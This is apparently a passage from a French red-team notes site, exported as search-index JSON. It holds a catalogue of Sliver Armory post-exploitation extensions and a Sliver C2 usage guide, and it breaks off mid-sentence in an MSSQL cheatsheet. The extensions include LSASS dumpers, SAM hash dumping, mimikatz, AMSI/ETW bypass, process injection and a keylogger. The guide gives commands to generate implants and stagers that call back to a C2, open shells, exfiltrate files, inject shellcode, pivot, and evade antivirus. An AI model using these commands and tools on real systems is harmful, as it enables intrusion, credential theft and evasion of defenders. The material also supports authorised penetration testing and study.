chromiumkeydump v0.0.2 Extension Dump Chrome/Edge Masterkey coff-loader v1.0.14 Extension Load and execute Beacon Object Files (BOFs) in memory. credman v1.0.7 Extension Dump credentials using the CredsBackupCredentials API delegationbof v0.0.2 Extension LDAP checks for RBCD, Constrained, Constrained w/Protocol Transition, Unconstrained Delegation, ASREP, and Kerberoastable SPNs find-module v0.0.2 Extension Uses direct system calls to enumerate processes for specific modules find-proc-handle v0.0.2 Extension Uses direct system calls to enumerate processes for specific process handles handlekatz v0.0.1 Extension Implementation of handlekatz as a BOF (x64 only) hashdump v1.0.0 Extension Dump local SAM password hashes hollow v0.0.1 Extension EarlyBird process hollowing technique inject-amsi-bypass v0.0.2 Extension Beacon Object File (BOF) that bypasses AMSI in a remote process with code injection. inject-clipboard v0.0.9 Extension inject into a process inject-conhost v0.0.9 Extension inject into a process inject-createremotethread v0.0.9 Extension inject into a process inject-ctray v0.0.9 Extension inject into a process inject-dde v0.0.9 Extension inject into a process inject-etw-bypass v0.0.3 Extension Inject ETW Bypass into Remote Process via Syscalls (HellsGate HalosGate) inject-kernelcallbacktable v0.0.9 Extension inject into a process inject-ntcreatethread v0.0.9 Extension inject into a process inject-ntqueueapcthread v0.0.9 Extension inject into a process inject-setthreadcontext v0.0.9 Extension inject into a process inject-svcctrl v0.0.9 Extension inject into a process inject-tooltip v0.0.9 Extension inject into a process inject-uxsubclassinfo v0.0.9 Extension inject into a process inline-execute-assembly v0.0.1 Extension in process .NET assembly execution jump-psexec v0.0.2 Extension psexec lateral movement module jump-wmiexec v0.0.2 Extension wmiexec lateral movement module kerbrute v0.0.1 Extension A tool to perform Kerberos pre-auth bruteforcing krbrelayup v0.0.1 Alias A universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced (the default settings). ldapsigncheck v0.0.1 Extension check LDAP signing mimikatz v0.0.1 Extension A little tool to play with Windows security nanodump v0.0.5 Extension A Beacon Object File that creates a minidump of the LSASS process. nanorobeus v0.0.2 Extension Beacon Object File for managing Kerberos tickets nps v0.0.2 Alias PowerShell rebuilt in C# for Red Teaming purposes patchit v0.0.1 Extension patch, check and revert AMSI and ETW for x64 process raw-keylogger 0.0.0 Extension Logs keystrokes using the raw input interface remote-adcs-request v0.0.9 Extension Request an certificate from an AD certificate server remote-adduser v0.0.9 Extension Add a new user to a machine remote-addusertogroup v0.0.9 Extension Add the specified user to the domain group remote-chrome-key v0.0.9 Extension Get Decryption key usable with Chlonium (https://github.com/rxwx/chlonium) remote-enable-user v0.0.9 Extension Unlock and enable a local / remote user account remote-get_priv v0.0.9 Extension Activate the specified token privledge, more for non-cobalt strike users remote-ghost_task v0.0.9 Extension direct registry manipulation to create scheduled tasks without triggering the usual event logs remote-lastpass v0.0.9 Extension Searches memory for LastPass passwords and hashes remote-office-tokens v0.0.9 Extension Searches memory for Office JWT Access Tokens remote-procdump v0.0.9 Extension Dumps the specified process to the specified output file remote-process-destroy v0.0.9 Extension Attempt to crash a local process by cutting all handles in it. remote-process-list-handles v0.0.9 Extension list the various handles a process has open remote-reg-delete v0.0.9 Extension Delete a registry key or value remote-reg-save v0.0.9 Extension backup a registry have to a file on disk (requires Enabled SEBackup Priv) remote-reg-set v0.0.9 Extension Dumps the specified process to the specified output file remote-sc-config v0.0.9 Extension configure an existing service remote-sc-create v0.0.9 Extension Create a new service on a windows system remote-sc-delete v0.0.9 Extension delete a service from a windows based computer remote-sc-description v0.0.9 Extension change description of a server remote-sc-failure v0.0.9 Extension sc_failure remote-sc-start v0.0.9 Extension Start service on a windows based system remote-sc-stop v0.0.9 Extension stop service on a windows based system remote-schtasks-delete v0.0.9 Extension Delete a scheduled task remote-schtasks-stop v0.0.9 Extension stop a running scheduled task remote-schtaskscreate v0.0.9 Extension Unlock and enable a local / remote user account remote-schtasksrun v0.0.9 Extension run a scheduled task remote-setuserpass v0.0.9 Extension set the password for a given user account remote-shspawnas v0.0.9 Extension spawn / inject as specified user remote-slack_cookie v0.0.9 Extension Collect the Slack authentication cookie from a Slack process remote-suspendresume v0.0.9 Extension uspend a process by pid remote-unexpireuser v0.0.9 Extension Enables and unlocks the specified user account rubeus v0.0.24 Alias Rubeus is a C# tool set for raw Kerberos interaction and abuses. sa-adcs-enum v0.0.21 Extension Enumerates CAs and templates in the AD using Win32 functions sa-adcs-enum-com v0.0.21 Extension Enumerates CAs and templates in the AD using ICertConfig COM object sa-adcs-enum-com2 v0.0.21 Extension Enumerates CAs and templates in the AD using IX509PolicyServerListManager COM object sa-adv-audit-policies v0.0.21 Extension Retrieves advanced security audit policies sa-arp v0.0.21 Extension Lists ARP table sa-cacls v0.0.21 Extension Lists user permissions for the specified file, wildcards supported sa-driversigs v0.0.21 Extension Enumerate installed services Image paths sa-enum-filter-driver v0.0.21 Extension Enumerates all the filter drivers sa-enum-local-sessions v0.0.21 Extension Enumerate the currently attached user sessions both local and over rdp sa-env v0.0.21 Extension List process environment variables sa-find-loaded-module v0.0.21 Extension Finds what processes modulepart is loaded into, optionally searching just procnamepart sa-get-netsession v0.0.21 Extension Enumerates all sessions on the specified computer or the local one sa-get-netsession2 v0.0.21 Extension Modified version of netsession that supports BOFHound sa-get-password-policy v0.0.21 Extension Gets target server or domain's configured password policy and lockouts sa-ipconfig v0.0.21 Extension Simply gets ipv4 addresses, hostname and dns server sa-ldapsearch v0.0.21 Extension Execute LDAP searches (non paged) sa-list_firewall_rules v0.0.21 Extension List Windows firewall rules sa-listdns v0.0.21 Extension Pulls dns cache entries, attempts to query and resolve each sa-listmods v0.0.21 Extension List a process' modules (DLL) sa-locale v0.0.21 Extension List system locale language, locale ID, date, time, and country sa-netgroup v0.0.21 Extension Lists Groups from the default (or specified) domain sa-netlocalgroup v0.0.21 Extension List local groups from the local (or specified) computer sa-netlocalgroup2 v0.0.21 Extension List server group members sa-netloggedon v0.0.21 Extension Return users logged on the local or remote computer sa-netloggedon2 v0.0.21 Extension Modified version of netloggedon that supports BOFHound sa-netshares v0.0.21 Extension List shares on local or remote computer sa-netstat v0.0.21 Extension TCP / UDP IPv4 netstat listing sa-nettime v0.0.21 Extension Display time on remote computer sa-netuptime v0.0.21 Extension Return information about the boot time on the local or remote computer sa-netview v0.0.21 Extension Net view sa-notepad v0.0.21 Extension Search for open notepad and notepad++ windows and grab text from the editor control object sa-nslookup v0.0.21 Extension Makes a dns query. NOTE: Some situations are limited due to observed crashes sa-probe v0.0.21 Extension Check if a specific port is open sa-reg-query v0.0.21 Extension Query the Windows registry sa-regsession v0.0.21 Extension Return logged on user SIDs by enumerating HKEY_USERS sa-routeprint v0.0.21 Extension Prints IPv4 configured routes sa-sc-enum v0.0.21 Extension Enumerate Windows services sa-sc-qc v0.0.21 Extension Queries the configuration information for a specified service. sa-sc-qdescription v0.0.21 Extension sc qdescription implementation in bof sa-sc-qfailure v0.0.21 Extension sc qfailure implementation in bof sa-sc-qtriggerinfo v0.0.21 Extension Queries a service for trigger conditions. sa-sc-query v0.0.21 Extension sc query implementation in bof sa-schtasksenum v0.0.21 Extension Enumerates all scheduled tasks on the local or if provided remote machine sa-schtasksquery v0.0.21 Extension Queries the given task from the local or if provided remote machine sa-tasklist v0.0.21 Extension Get a list of running processes including PID, PPID and CommandLine (uses wmi) sa-uptime v0.0.21 Extension Prints system boot time and how long it's been since then sa-vssenum v0.0.21 Extension Enumerates shadow copies on some server 2012+ machines sa-whoami v0.0.21 Extension Simulates whoami /all sa-windowlist v0.0.21 Extension Lists visible windows in the current users session sa-wmi-query v0.0.21 Extension Lists visible windows in the current users session scshell v0.0.2 Extension Fileless lateral movement seatbelt v0.0.5 Alias Seatbelt is a C# project that performs a number of security oriented host-survey 'safety checks' secinject v0.0.1 Extension Section Mapping Process Injection sharp-hound-3 v0.0.2 Alias C# based BloodHound Ingestor sharp-hound-4 v0.0.2 Alias C# based BloodHound Ingestor sharp-smbexec v0.0.3 Alias A native C# conversion of the Invoke-SMBExec powershell script sharp-wmi v0.0.2 Alias C# implementation of various WMI functionality sharpchrome v0.0.3 Alias adaptation of work from @gentilkiwi and @djhohnstein, specifically his SharpChrome project sharpdpapi v0.0.3 Alias # port of some DPAPI functionality from @gentilkiwi's Mimikatz project sharpmapexec v0.0.1 Alias A sharpen version of CrackMapExec sharplaps v0.0.1 Alias Retrieve LAPS password from LDAP sharpersist v0.0.2 Alias Windows persistence toolkit sharprdp v0.0.1 Alias Remote Desktop Protocol .NET Console Application for Authenticated Command Execution sharpsccm v0.0.2 Alias A C# utility for interacting with SCCM sharpsecdump v0.0.1 Alias C# port of impacket's secretsdump.py functionality sharpsh v0.0.1 Alias C# .Net Framework program that uses RunspaceFactory for Powershell command execution. sharpup v0.0.1 Alias C# port of various PowerUp functionality sharpview v0.0.1 Alias C# implementation of harmj0y's PowerView sqlrecon v0.0.3 Alias MS SQL toolkit designed for offensive reconnaissance and post-exploitation syscalls_shinject v0.0.1 Extension Inject shellcode (either custom or beacon) into remote process using Syscalls tgtdelegation v0.0.4 Extension tgtdelegation: Obtain a usable Kerberos TGT threadless-inject v0.0.1 Extension Execute shellcode within a remote process via hooking function calls. unhook-bof v0.0.2 Extension Remove API hooks from a Beacon process. winrm v0.0.1 Extension Execute commands remotely via WinRM Name Contains .net-execute sharp-smbexec, sharp-wmi, sharpmapexec, sharpersist, nopowershell, sharprdpsharpsh, sharpsccm .net-pivot krbrelayup, rubeus, certify, sharpsecdump, sharpchrome, sharpdpapisqlrecon, sharplaps .net-recon seatbelt, sharp-hound-3, sharpup, sharpview, sharp-hound-4 c2-tool-collection c2tc-addmachineaccount, c2tc-askcreds, c2tc-domaininfo, c2tc-kerberoast, c2tc-kerbhash, c2tc-klistc2tc-lapsdump, c2tc-petitpotam, c2tc-psc, c2tc-psk, c2tc-psmc2tc-psw, c2tc-psx, c2tc-smbinfo, c2tc-spray-ad, c2tc-startwebclientc2tc-wdtoggle, c2tc-winver cs-remote-ops-bofs remote-adcs-request, remote-adduser, remote-addusertogroup, remote-chrome-key, remote-enable-user, remote-lastpassremote-office-tokens, remote-procdump, remote-process-destroy, remote-process-list-handles, remote-reg-deleteremote-reg-save, remote-reg-set, remote-sc-config, remote-sc-create, remote-sc-deleteremote-sc-description, remote-sc-start, remote-sc-stop, remote-schtasks-delete, remote-schtasks-stopremote-schtaskscreate, remote-schtasksrun, remote-setuserpass, remote-shspawnas, remote-suspendresumeremote-unexpireuser, remote-get_priv, remote-ghost_task, remote-sc_failure, remote-slack_cookie kerberos bof-roast, delegationbof, c2tc-kerberoast, tgtdelegation, kerbrute, nanorobeus situational-awareness sa-adcs-enum, sa-adcs-enum-com, sa-adcs-enum-com2, sa-adv-audit-policies, sa-arp, sa-caclssa-driversigs, sa-enum-filter-driver, sa-enum-local-sessions, sa-find-loaded-module, sa-get-password-policysa-get-netsession, sa-ipconfig, sa-ldapsearch, sa-listdns, sa-listmodssa-netgroup, sa-netlocalgroup, sa-netshares, sa-netstat, sa-netviewsa-nslookup, sa-reg-query, sa-routeprint, sa-sc-enum, sa-sc-qcsa-sc-qdescription, sa-sc-qfailure, sa-sc-qtriggerinfo, sa-sc-query, sa-schtasksenumsa-schtasksquery, sa-tasklist, sa-uptime, sa-vssenum, sa-whoamisa-windowlist, sa-wmi-query, sa-env, sa-get-netsession2, sa-list_firewall_rulessa-locale, sa-netlocalgroup2, sa-netloggedon, sa-netloggedon2, sa-nettimesa-netuptime, sa-ldapsearch, sa-notepad, sa-probe, sa-regsession windows-bypass inject-etw-bypass, inject-amsi-bypass, unhook-bof, patchit windows-credentials nanodump, credman, chromiumkeydump, handlekatz, mimikatz windows-inject hollow, secinject, syscalls_shinject, threadless-inject, inject-tooltip, inject-kernelcallbacktableinject-uxsubclassinfo, inject-ntcreatethread, inject-dde, inject-ntqueueapcthread, inject-conhostinject-svcctrl, inject-ctray, inject-createremotethread, inject-setthreadcontext, inject-clipboard windows-pivot scshell, bof-servicemove, winrm, jump-wmiexec, jump-psexec"},{"location":"Red%20Team/C2/Sliver/Utilisation/","title":"Utilisation","text":"<p>Objectif : Sliver est un framework de Command &amp; Control (C2) moderne, multiplateforme (\u00e9crit en Go), con\u00e7u pour les op\u00e9rations Red Team et les tests d'intrusion, avec un accent sur la s\u00e9curit\u00e9 op\u00e9rationnelle (OPSEC) et la flexibilit\u00e9.</p> <p>Source : https://github.com/BishopFox/sliver</p>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#concepts-cles","title":"\ud83d\udd11 Concepts Cl\u00e9s","text":"<ul> <li>Serveur C2 (Sliver Server) : Le composant central qui g\u00e8re les \u00e9couteurs (listeners), les implants, et fournit la console d'interaction pour l'op\u00e9rateur.</li> <li>Listener : Point d'\u00e9coute sur le serveur C2 o\u00f9 les implants se connectent (callback). Sliver supporte plusieurs protocoles (HTTP/S, mTLS, DNS, WireGuard...).</li> <li>Profil (Profile) : D\u00e9finit les caract\u00e9ristiques et le comportement d'un implant (type de communication, d\u00e9lais, indicateurs, etc.).</li> <li>Implant (Beacon/Session) : L'agent malveillant ex\u00e9cut\u00e9 sur la machine cible.<ul> <li>Beacon : Mode asynchrone, l'implant se connecte p\u00e9riodiquement au C2 (check-in) pour r\u00e9cup\u00e9rer des t\u00e2ches. Plus discret.</li> <li>Session : Mode interactif, connexion persistante permettant une interaction en temps r\u00e9el (shell, etc.). Plus bruyant.</li> </ul> </li> <li>Stager : Petit payload initial qui t\u00e9l\u00e9charge et ex\u00e9cute l'implant complet. Permet de r\u00e9duire la taille initiale du malware.</li> <li>Armory : Syst\u00e8me d'extensions pour ajouter des fonctionnalit\u00e9s via des BOFs (Beacon Object Files), des assemblies .NET, ou des alias de commandes. (Voir votre note <code>Armory.md</code>)</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#gestion-du-serveur-c2","title":"\ud83d\udda5\ufe0f Gestion du Serveur C2","text":""},{"location":"Red%20Team/C2/Sliver/Utilisation/#demarrer-le-serveur-sliver","title":"D\u00e9marrer le serveur Sliver","text":"<pre><code># D\u00e9marrage simple (g\u00e9n\u00e8re les certificats/cl\u00e9s si n\u00e9cessaire)\n./sliver-server\n\n# D\u00e9marrer avec une base de donn\u00e9es existante\n./sliver-server --database /chemin/vers/sliver.db --lhost &lt;IP_Serveur_C2&gt;\n</code></pre> <ul> <li>Contexte : Lance le serveur C2 et sa console interactive. La premi\u00e8re ex\u00e9cution g\u00e9n\u00e8re les configurations et bases de donn\u00e9es n\u00e9cessaires.</li> <li>Astuce : Utilisez <code>--lhost</code> pour sp\u00e9cifier l'adresse IP que les implants devront contacter, surtout si le serveur est derri\u00e8re un redirecteur ou NAT.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#commandes-de-base-de-la-console-sliver","title":"Commandes de base de la console Sliver","text":"<pre><code>help             # Affiche l'aide g\u00e9n\u00e9rale ou pour une commande sp\u00e9cifique\nprofiles         # G\u00e9rer les profils d'implants\nlisteners        # G\u00e9rer les listeners\njobs             # G\u00e9rer les t\u00e2ches en arri\u00e8re-plan\nimplants         # G\u00e9rer les implants g\u00e9n\u00e9r\u00e9s\nsessions         # Lister et interagir avec les sessions interactives\nbeacons          # Lister et interagir avec les beacons asynchrones\nuse &lt;id&gt;         # S\u00e9lectionner une session ou un beacon pour interagir\nexit / quit      # Quitter la console Sliver\n</code></pre>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#gestion-des-listeners","title":"\ud83d\udc42 Gestion des Listeners","text":"<ul> <li>Objectif : Cr\u00e9er des points d'\u00e9coute pour les callbacks des implants.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#creer-un-listener-https","title":"Cr\u00e9er un Listener HTTP(S)","text":"<pre><code># HTTP simple (moins s\u00e9curis\u00e9, plus facile \u00e0 d\u00e9tecter)\nhttp --bind :80 --lhost &lt;IP_ou_Domaine_C2&gt;\n\n# HTTPS (chiffrement TLS standard)\nhttps --bind :443 --lhost &lt;IP_ou_Domaine_C2&gt; [--letsencrypt]\n# --letsencrypt : Tente d'obtenir un certificat Let's Encrypt valide (n\u00e9cessite port 80 ouvert et nom de domaine configur\u00e9)\n</code></pre> <ul> <li>Contexte : Listeners bas\u00e9s sur HTTP/S, courants mais potentiellement sujets \u00e0 l'inspection.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#creer-un-listener-mtls-mutual-tls","title":"Cr\u00e9er un Listener mTLS (Mutual TLS)","text":"<pre><code>mtls --bind :443 --lhost &lt;IP_ou_Domaine_C2&gt;\n</code></pre> <ul> <li>Contexte : Utilise TLS avec authentification mutuelle (le client et le serveur v\u00e9rifient leurs certificats respectifs).</li> <li>Usage : Plus s\u00e9curis\u00e9 et discret que HTTPS standard, car le trafic ne ressemble pas \u00e0 du trafic web classique sans les bons certificats.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#creer-un-listener-dns","title":"Cr\u00e9er un Listener DNS","text":"<pre><code>dns --domain &lt;votre_domaine_controle&gt;\n</code></pre> <ul> <li>Contexte : Communication C2 via des requ\u00eates DNS (TXT, CNAME, A...).</li> <li>Usage : Tr\u00e8s discret, peut contourner des firewalls stricts qui n'inspectent pas le trafic DNS. N\u00e9cessite de contr\u00f4ler un nom de domaine et de configurer les enregistrements NS pour pointer vers votre serveur Sliver.</li> <li>Pr\u00e9requis : Contr\u00f4le d'un nom de domaine et configuration DNS appropri\u00e9e.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#lister-les-listeners-actifs","title":"Lister les listeners actifs","text":"<pre><code>listeners\njobs # Les listeners tournent comme des jobs\n</code></pre>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#arreter-un-listener","title":"Arr\u00eater un listener","text":"<pre><code>jobs # Trouver l'ID du job du listener\njobs kill &lt;job_id&gt;\n</code></pre>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#generation-dimplants-et-stagers","title":"\ud83e\uddec G\u00e9n\u00e9ration d'Implants et Stagers","text":"<ul> <li>Objectif : Cr\u00e9er les ex\u00e9cutables (ou shellcode) \u00e0 d\u00e9ployer sur les cibles.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#generer-un-implant-complet-stageless","title":"G\u00e9n\u00e9rer un implant complet (stageless)","text":"<pre><code># Utilise le profil par d\u00e9faut et se connecte au premier listener compatible (ex: mTLS)\ngenerate --save /chemin/vers/implant_mtls\n\n# Sp\u00e9cifier un protocole et un OS\ngenerate --mtls &lt;IP_C2&gt;:&lt;Port&gt; --os windows --arch amd64 --format exe --save /chemin/vers/implant_win.exe\ngenerate --http &lt;IP_C2&gt;:&lt;Port&gt; --os linux --arch amd64 --format elf --save /chemin/vers/implant_linux\n\n# Options courantes :\n# --os &lt;windows|linux|macos&gt; : Syst\u00e8me d'exploitation cible\n# --arch &lt;amd64|386&gt; : Architecture cible\n# --format &lt;exe|shared|service|shellcode&gt; : Format de sortie\n# --skip-symbols : R\u00e9duit la taille, peut aider \u00e0 l'\u00e9vasion\n# --save &lt;chemin&gt; : Chemin o\u00f9 sauvegarder l'implant\n</code></pre> <ul> <li>Contexte : Cr\u00e9e un implant autonome contenant toute la configuration n\u00e9cessaire pour se connecter au C2.</li> <li>Usage : D\u00e9ploiement direct sur la cible. Plus gros fichier, mais ne n\u00e9cessite pas de seconde \u00e9tape de t\u00e9l\u00e9chargement.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#generer-un-stager","title":"G\u00e9n\u00e9rer un stager","text":"<pre><code>generate stager --lhost &lt;IP_C2&gt; --lport &lt;Port_Listener&gt; --protocol &lt;http|https|mtls&gt; --os windows --arch amd64 --format exe --save /chemin/vers/stager.exe\n</code></pre> <ul> <li>Contexte : Cr\u00e9e un petit payload qui, une fois ex\u00e9cut\u00e9, contacte le listener sp\u00e9cifi\u00e9 pour t\u00e9l\u00e9charger et ex\u00e9cuter l'implant complet en m\u00e9moire.</li> <li>Usage : Utile pour r\u00e9duire la taille du payload initial (\u00e9vasion AV, limites de taille d'upload) ou pour des vecteurs d'acc\u00e8s comme les macros Office.</li> <li>Options courantes : Similaires \u00e0 <code>generate</code>, plus <code>--lhost</code>, <code>--lport</code>, <code>--protocol</code> pour sp\u00e9cifier le listener de staging.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#interaction-avec-les-implants","title":"\ud83c\udfae Interaction avec les Implants","text":""},{"location":"Red%20Team/C2/Sliver/Utilisation/#lister-les-beacons-et-sessions","title":"Lister les Beacons et Sessions","text":"<pre><code>beacons    # Lister les implants en mode beacon (asynchrone)\nsessions   # Lister les implants en mode session (interactif)\n</code></pre>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#passer-en-mode-interactif-avec-un-beacon","title":"Passer en mode interactif avec un Beacon","text":"<pre><code>use &lt;beacon_id&gt;\ninteractive\n</code></pre> <ul> <li>Contexte : Convertit un beacon asynchrone en session interactive persistante.</li> <li>OPSEC : Augmente le \"bruit\" r\u00e9seau et la d\u00e9tectabilit\u00e9 par rapport au mode beacon.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#utiliser-une-session-ou-un-beacon","title":"Utiliser une Session ou un Beacon","text":"<pre><code>use &lt;session_id | beacon_id&gt;\n</code></pre> <ul> <li>Contexte : S\u00e9lectionne un implant pour lui envoyer des commandes. Le prompt change pour indiquer l'implant actif.</li> <li>Exemple Prompt : <code>sliver (IMPLANT_NAME)</code></li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#mettre-une-session-en-arriere-plan","title":"Mettre une session en arri\u00e8re-plan","text":"<pre><code>background\n</code></pre> <ul> <li>Contexte : Retourne \u00e0 la console principale de Sliver tout en gardant la session active.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#commandes-courantes-dans-un-implant","title":"\ud83d\udcbb Commandes Courantes dans un Implant","text":"<p>(Doivent \u00eatre ex\u00e9cut\u00e9es apr\u00e8s avoir s\u00e9lectionn\u00e9 un implant avec <code>use &lt;id&gt;</code>)</p>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#obtenir-un-shell-systeme","title":"Obtenir un shell syst\u00e8me","text":"<pre><code>shell\n</code></pre> <ul> <li>Contexte : Ouvre un shell interactif (<code>cmd.exe</code> ou <code>/bin/bash</code>) sur la machine cible.</li> <li>Usage : Ex\u00e9cution de commandes syst\u00e8me de base.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#executer-une-commande-unique","title":"Ex\u00e9cuter une commande unique","text":"<pre><code>execute -o &lt;commande&gt; [arguments...]\n# Exemple: execute -o net user\n# Exemple: execute -o powershell.exe -ExecutionPolicy Bypass -C \"Get-Process\"\n</code></pre> <ul> <li>Contexte : Ex\u00e9cute une commande et r\u00e9cup\u00e8re sa sortie sans ouvrir de shell interactif complet. <code>-o</code> capture la sortie.</li> <li>Usage : Ex\u00e9cution rapide de commandes sp\u00e9cifiques.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#transfert-de-fichiers","title":"Transfert de fichiers","text":"<pre><code>upload &lt;fichier_local&gt; &lt;chemin_distant&gt;\ndownload &lt;chemin_distant&gt; [fichier_local]\n</code></pre> <ul> <li>Usage : Transf\u00e9rer des outils vers la cible ou exfiltrer des fichiers.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#gestion-des-processus","title":"Gestion des processus","text":"<pre><code>ps              # Lister les processus\nkill &lt;pid&gt;      # Tuer un processus\ngetsystem       # Tente d'obtenir les privil\u00e8ges SYSTEM (Windows)\nprocinject &lt;pid&gt; &lt;shellcode_file.bin&gt; # Injecter du shellcode dans un processus\n</code></pre> <ul> <li>Usage : \u00c9num\u00e9ration, \u00e9l\u00e9vation de privil\u00e8ges, injection de code (ex: pour ex\u00e9cuter Mimikatz en m\u00e9moire).</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#execution-dextensions-armory","title":"Ex\u00e9cution d'extensions Armory","text":"<pre><code># Ex\u00e9cuter un BOF (Beacon Object File)\nexecute-bof &lt;fichier.o&gt; &lt;fonction_a_appeler&gt; [arguments_encod\u00e9s...]\n\n# Ex\u00e9cuter un assembly .NET en m\u00e9moire\nexecute-assembly &lt;fichier.exe&gt; [arguments...]\n\n# Utiliser un alias d\u00e9fini dans l'Armory\n&lt;nom_alias&gt; [arguments...]\n# Exemple (si un alias 'whoami_bof' existe): whoami_bof\n</code></pre> <ul> <li>Contexte : Utilise les capacit\u00e9s d'ex\u00e9cution en m\u00e9moire de Sliver pour lancer des outils suppl\u00e9mentaires sans les \u00e9crire sur le disque.</li> <li>Usage : Ex\u00e9cuter des outils comme Mimikatz (BOF), Seatbelt (.NET), Rubeus (.NET) de mani\u00e8re plus discr\u00e8te.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#pivoting-et-tunnels","title":"Pivoting et Tunnels","text":"<pre><code>pivot tcp &lt;ip_cible_interne&gt; &lt;port_cible_interne&gt; &lt;port_local_serveur_c2&gt; # Cr\u00e9e un tunnel TCP simple\nsocks5 start # D\u00e9marre un proxy SOCKS5 via l'implant\nifconfig # Voir/g\u00e9rer les interfaces r\u00e9seau pour le pivoting\n</code></pre> <ul> <li>Contexte : Permet d'utiliser l'implant comme relais pour atteindre d'autres machines sur le r\u00e9seau interne de la cible.</li> <li>Usage : Mouvement lat\u00e9ral, acc\u00e8s \u00e0 des services non directement expos\u00e9s.</li> </ul>"},{"location":"Red%20Team/C2/Sliver/Utilisation/#considerations-opsec","title":"\ud83d\udee1\ufe0f Consid\u00e9rations OPSEC","text":"<ul> <li>Profils : Personnalisez les profils (<code>profiles new ...</code>) pour modifier les indicateurs par d\u00e9faut de l'implant (User-Agent, d\u00e9lais de callback, jitter, etc.). Cela permet de mieux masquer l'activit\u00e9 C2 ou de l'adapter pour ressembler \u00e0 du trafic l\u00e9gitime connu.</li> <li>Staging : Les stagers sont plus petits et peuvent \u00eatre utiles pour contourner les d\u00e9tections initiales bas\u00e9es sur la taille ou pour des vecteurs comme les macros. Cependant, ils n\u00e9cessitent une connexion suppl\u00e9mentaire pour t\u00e9l\u00e9charger l'implant complet, ce qui cr\u00e9e une autre opportunit\u00e9 de d\u00e9tection par les outils de surveillance r\u00e9seau (NDR). Les implants stageless sont plus gros mais plus autonomes une fois ex\u00e9cut\u00e9s.</li> <li>Protocoles : mTLS est g\u00e9n\u00e9ralement plus discret que HTTPS standard. </li> <li>Chiffrement : Tout le trafic C2 de Sliver est chiffr\u00e9 (TLS, mTLS, WireGuard). Assurez-vous d'utiliser des protocoles robustes comme mTLS lorsque c'est possible.</li> <li>Ex\u00e9cution en m\u00e9moire : Privil\u00e9giez <code>execute-assembly</code> et <code>execute-bof</code> pour lancer des outils et des commandes. Cela \u00e9vite d'\u00e9crire des fichiers ex\u00e9cutables sur le disque de la cible, r\u00e9duisant ainsi consid\u00e9rablement les chances de d\u00e9tection par les antivirus bas\u00e9s sur les signatures de fichiers.</li> <li>Nettoyage : Une fois l'op\u00e9ration termin\u00e9e, pensez \u00e0 tuer les processus que vous auriez pu injecter (<code>procinject</code>), \u00e0 arr\u00eater les pivots (<code>pivot stop &lt;id&gt;</code>) et les proxies SOCKS (<code>socks5 stop</code>), et id\u00e9alement, \u00e0 supprimer l'implant de la machine cible si la persistance n'est pas un objectif.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/","title":"MSSQL","text":""},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/#connexion-depuis-un-poste-windows","title":"\ud83d\udd17 Connexion (depuis un poste Windows)","text":""},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/#se-connecter-a-un-serveur-sql-server","title":"Se connecter \u00e0 un serveur SQL Server","text":"<pre><code>sqlcmd -S $serveur$ -U $user -P $password\n</code></pre> <p>Permet de se connecter \u00e0 une base de donn\u00e9es SQL Server depuis un terminal Windows en utilisant sqlcmd.</p> <ul> <li><code>$serveur$</code> : Nom ou adresse IP du serveur SQL</li> <li><code>$user$</code> : Nom d\u2019utilisateur</li> <li><code>$password$</code> : Mot de passe</li> </ul> <p>[!Astuce] Si l\u2019authentification Windows est utilis\u00e9e, remplace <code>-U $user$ -P $password</code> par <code>-E</code> pour utiliser l'utilisateur actuel.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/#requetes-de-base","title":"\ud83d\ude80 Requ\u00eates de base","text":""},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/#lister-les-bases-de-donnees","title":"Lister les bases de donn\u00e9es","text":"<pre><code>SELECT name FROM master.sys.databases;\n</code></pre> <p>Affiche la liste des bases de donn\u00e9es disponibles sur le serveur SQL.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/#selectionner-une-base-de-donnees","title":"S\u00e9lectionner une base de donn\u00e9es","text":"<pre><code>USE &lt;nom_base_de_donn\u00e9es&gt;;\n</code></pre> <p>Permet de choisir une base de donn\u00e9es sp\u00e9cifique pour ex\u00e9cuter les requ\u00eates suivantes.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/#lister-les-tables-dune-base-de-donnees","title":"Lister les tables d\u2019une base de donn\u00e9es","text":"<pre><code>SELECT * FROM information_schema.tables;\n</code></pre> <p>Renvoie la liste des tables pr\u00e9sentes dans la base de donn\u00e9es en cours.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/#lister-les-serveurs-lies","title":"Lister les serveurs li\u00e9s","text":"<pre><code>EXEC sp_linkedservers\nSELECT * FROM sys.servers;\n</code></pre> <p>Affiche les serveurs SQL Server li\u00e9s permettant 